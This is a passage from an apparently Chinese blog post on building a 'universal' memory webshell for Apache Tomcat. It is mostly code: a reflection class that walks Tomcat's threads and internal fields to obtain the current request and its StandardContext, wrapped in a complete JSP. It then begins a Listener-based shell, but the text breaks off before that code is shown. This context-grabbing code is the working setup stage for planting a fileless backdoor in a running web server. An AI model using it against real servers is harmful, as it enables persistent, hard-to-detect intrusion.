class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat6789</span> &#123;<br>    String uri;<br>    String serverName;<br>    StandardContext standardContext;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;&#125;<br>            <span class="hljs-keyword">catch</span> (IllegalAccessException e)&#123;&#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <br></code></pre></td></tr></table></figure><h4 id="è·å–Requestä»¥åŠç›¸å…³è·¯å¾„"><a href="#è·å–Requestä»¥åŠç›¸å…³è·¯å¾„" class="headerlink" title="è·å–Requestä»¥åŠç›¸å…³è·¯å¾„"></a>è·å–Requestä»¥åŠç›¸å…³è·¯å¾„</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Tomcat6789</span><span class="hljs-params">()</span> &#123;<br>           Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>           Object object;<br>           <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br><br>               <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-keyword">continue</span>;<br>               &#125;<br>               <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;exec&quot;</span>)) &#123;<br>                   <span class="hljs-keyword">continue</span>;<br>               &#125;<br>               <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>               <span class="hljs-keyword">if</span> (!(target <span class="hljs-keyword">instanceof</span> Runnable)) &#123;<br>                   <span class="hljs-keyword">continue</span>;<br>               &#125;<br><br>               <span class="hljs-keyword">try</span> &#123;<br>                   object = getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>);<br>               &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                   <span class="hljs-keyword">continue</span>;<br>               &#125;<br>               <span class="hljs-keyword">if</span> (object == <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-keyword">continue</span>;<br>               &#125;<br>               java.util.<span class="hljs-type">ArrayList</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (java.util.ArrayList) getField(object, <span class="hljs-string">&quot;processors&quot;</span>);<br>               <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> processors.iterator();<br>               <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>                   <span class="hljs-type">Object</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> iterator.next();<br><br>                   <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> getField(next, <span class="hljs-string">&quot;req&quot;</span>);<br>                   <span class="hljs-type">Object</span> <span class="hljs-variable">serverPort</span> <span class="hljs-operator">=</span> getField(req, <span class="hljs-string">&quot;serverPort&quot;</span>);<br>                   <span class="hljs-keyword">if</span> (serverPort.equals(-<span class="hljs-number">1</span>))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                   org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">serverNameMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;serverNameMB&quot;</span>);<br>                   <span class="hljs-built_in">this</span>.serverName = (String) getField(serverNameMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                       <span class="hljs-built_in">this</span>.serverName = serverNameMB.toString();<br>                   &#125;<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                       <span class="hljs-built_in">this</span>.serverName = serverNameMB.getString();<br>                   &#125;<br><br>                   org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">uriMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;uriMB&quot;</span>);<br>                   <span class="hljs-built_in">this</span>.uri = (String) getField(uriMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                       <span class="hljs-built_in">this</span>.uri = uriMB.toString();<br>                   &#125;<br>                   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                       <span class="hljs-built_in">this</span>.uri = uriMB.getString();<br>                   &#125;<br><br>                   <span class="hljs-built_in">this</span>.getStandardContext();<br>                   <span class="hljs-keyword">return</span>;<br>               &#125;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204172057529.png" alt="##"></p><h4 id="è·å–StandardContext"><a href="#è·å–StandardContext" class="headerlink" title="è·å–StandardContext"></a>è·å–StandardContext</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getStandardContext</span><span class="hljs-params">()</span> &#123;<br>      Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>          <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>              <span class="hljs-keyword">continue</span>;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>              HashMap children;<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>              <span class="hljs-keyword">try</span> &#123;<br>                  jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>              &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>              <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>)&#123;<br>                  <span class="hljs-keyword">try</span>&#123;<br>                      jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                  &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123; <span class="hljs-keyword">return</span>; &#125;<br>              &#125;<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> getField(getField(getField(getField(getField(jioEndPoint, <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;proto&quot;</span>), <span class="hljs-string">&quot;adapter&quot;</span>), <span class="hljs-string">&quot;connector&quot;</span>), <span class="hljs-string">&quot;service&quot;</span>);<br>              <span class="hljs-type">StandardEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>              <span class="hljs-keyword">try</span> &#123;<br>                  engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;container&quot;</span>);<br>              &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>              <span class="hljs-keyword">if</span> (engine == <span class="hljs-literal">null</span>)&#123;<br>                  engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;engine&quot;</span>);<br>              &#125;<br><br>              children = (HashMap) getField(engine, <span class="hljs-string">&quot;children&quot;</span>);<br>              <span class="hljs-type">StandardHost</span> <span class="hljs-variable">standardHost</span> <span class="hljs-operator">=</span> (StandardHost) children.get(<span class="hljs-built_in">this</span>.serverName);<br><br>              children = (HashMap) getField(standardHost, <span class="hljs-string">&quot;children&quot;</span>);<br>              <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> children.keySet().iterator();<br>              <span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>                  <span class="hljs-type">String</span> <span class="hljs-variable">contextKey</span> <span class="hljs-operator">=</span> (String) iterator.next();<br>                  <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.uri.startsWith(contextKey)))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                  <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) children.get(contextKey);<br>                  <span class="hljs-built_in">this</span>.standardContext = standardContext;<br>                  <span class="hljs-keyword">return</span>;<br>              &#125;<br>          &#125;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´è·å–StandarfContect"><a href="#å®Œæ•´è·å–StandarfContect" class="headerlink" title="å®Œæ•´è·å–StandarfContect"></a>å®Œæ•´è·å–StandarfContect</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Iterator&quot;</span>%&gt;<br><br>&lt;%<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat6789</span> &#123;<br>    String uri;<br>    String serverName;<br>    StandardContext standardContext;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getField</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Field declaredField;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> object.getClass();<br>        <span class="hljs-keyword">while</span> (clazz != Object.class) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br><br>                declaredField = clazz.getDeclaredField(fieldName);<br>                declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> declaredField.get(object);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;&#125;<br>            <span class="hljs-keyword">catch</span> (IllegalAccessException e)&#123;&#125;<br>            clazz = clazz.getSuperclass();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Tomcat6789</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        Object object;<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br><br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;exec&quot;</span>)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!(target <span class="hljs-keyword">instanceof</span> Runnable)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                object = getField(getField(getField(target, <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;global&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (object == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            java.util.<span class="hljs-type">ArrayList</span> <span class="hljs-variable">processors</span> <span class="hljs-operator">=</span> (java.util.ArrayList) getField(object, <span class="hljs-string">&quot;processors&quot;</span>);<br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> processors.iterator();<br>            <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> iterator.next();<br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> getField(next, <span class="hljs-string">&quot;req&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">serverPort</span> <span class="hljs-operator">=</span> getField(req, <span class="hljs-string">&quot;serverPort&quot;</span>);<br>                <span class="hljs-keyword">if</span> (serverPort.equals(-<span class="hljs-number">1</span>))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">serverNameMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;serverNameMB&quot;</span>);<br>                <span class="hljs-built_in">this</span>.serverName = (String) getField(serverNameMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-built_in">this</span>.serverName = serverNameMB.toString();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.serverName == <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-built_in">this</span>.serverName = serverNameMB.getString();<br>                &#125;<br><br>                org.apache.tomcat.util.buf.<span class="hljs-type">MessageBytes</span> <span class="hljs-variable">uriMB</span> <span class="hljs-operator">=</span> (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="hljs-string">&quot;uriMB&quot;</span>);<br>                <span class="hljs-built_in">this</span>.uri = (String) getField(uriMB, <span class="hljs-string">&quot;strValue&quot;</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-built_in">this</span>.uri = uriMB.toString();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.uri == <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-built_in">this</span>.uri = uriMB.getString();<br>                &#125;<br><br>                <span class="hljs-built_in">this</span>.getStandardContext();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getStandardContext</span><span class="hljs-params">()</span> &#123;<br>        Thread[] threads = (Thread[]) <span class="hljs-built_in">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="hljs-string">&quot;threads&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Thread thread : threads) &#123;<br>            <span class="hljs-keyword">if</span> (thread == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((thread.getName().contains(<span class="hljs-string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="hljs-string">&quot;http&quot;</span>))) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getField(thread, <span class="hljs-string">&quot;target&quot;</span>);<br>                HashMap children;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">jioEndPoint</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    jioEndPoint = getField(target, <span class="hljs-string">&quot;this$0&quot;</span>);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>                <span class="hljs-keyword">if</span> (jioEndPoint == <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-keyword">try</span>&#123;<br>                        jioEndPoint = getField(target, <span class="hljs-string">&quot;endpoint&quot;</span>);<br>                    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123; <span class="hljs-keyword">return</span>; &#125;<br>                &#125;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> getField(getField(getField(getField(getField(jioEndPoint, <span class="hljs-string">&quot;handler&quot;</span>), <span class="hljs-string">&quot;proto&quot;</span>), <span class="hljs-string">&quot;adapter&quot;</span>), <span class="hljs-string">&quot;connector&quot;</span>), <span class="hljs-string">&quot;service&quot;</span>);<br>                <span class="hljs-type">StandardEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;container&quot;</span>);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>                <span class="hljs-keyword">if</span> (engine == <span class="hljs-literal">null</span>)&#123;<br>                    engine = (StandardEngine) getField(service, <span class="hljs-string">&quot;engine&quot;</span>);<br>                &#125;<br><br>                children = (HashMap) getField(engine, <span class="hljs-string">&quot;children&quot;</span>);<br>                <span class="hljs-type">StandardHost</span> <span class="hljs-variable">standardHost</span> <span class="hljs-operator">=</span> (StandardHost) children.get(<span class="hljs-built_in">this</span>.serverName);<br><br>                children = (HashMap) getField(standardHost, <span class="hljs-string">&quot;children&quot;</span>);<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">iterator</span> <span class="hljs-operator">=</span> children.keySet().iterator();<br>                <span class="hljs-keyword">while</span> (iterator.hasNext())&#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">contextKey</span> <span class="hljs-operator">=</span> (String) iterator.next();<br>                    <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.uri.startsWith(contextKey)))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>                    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) children.get(contextKey);<br>                    <span class="hljs-built_in">this</span>.standardContext = standardContext;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> StandardContext <span class="hljs-title function_">getSTC</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.standardContext;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;%<br><span class="hljs-type">Tomcat6789</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tomcat6789</span>();<br>out.println(a.getSTC());<br>%&gt;<br><br><br></code></pre></td></tr></table></figure><h2 id="é€šæ€å†…å­˜é©¬"><a href="#é€šæ€å†…å­˜é©¬" class="headerlink" title="é€šæ€å†…å­˜é©¬"></a>é€šæ€å†…å­˜é©¬</h2><p>è¿™é‡Œå°±å†™äº†ä¸ªListener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 